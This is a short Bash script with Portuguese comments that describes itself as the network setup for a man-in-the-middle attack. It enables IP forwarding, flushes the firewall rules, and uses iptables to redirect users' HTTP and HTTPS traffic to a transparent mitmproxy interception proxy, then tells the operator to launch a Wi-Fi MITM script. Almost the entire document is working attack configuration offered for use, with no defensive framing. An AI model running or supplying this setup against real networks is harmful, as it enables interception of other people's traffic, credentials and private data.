#!/bin/bash
"""
SCRIPT DE CONFIGURAÇÃO DE REDE PARA ATAQUE MAN-IN-THE-MIDDLE (MITM)
------------------------------------------------------------------
Este script configura o roteamento de pacotes e as regras de firewall (iptables)
necessárias para redirecionar o tráfego dos usuários para o nosso proxy de interceptação.
"""

# 1. Habilitar IP Forwarding (Permite que o Linux atue como roteador)
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. Limpar regras anteriores
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X

# 3. Redirecionar tráfego HTTP (Porta 80) para o mitmproxy (Porta 8080)
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# 4. Redirecionar tráfego HTTPS (Porta 443) para o mitmproxy (Porta 8080)
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080

echo "[+] Configuração de rede MITM concluída."
echo "[+] Tráfego das portas 80 e 443 redirecionado para a porta 8080."
echo "[!] Agora inicie o mitmproxy: mitmdump -s tools/analyzers/wifi_mitm_proxy.py --mode transparent"
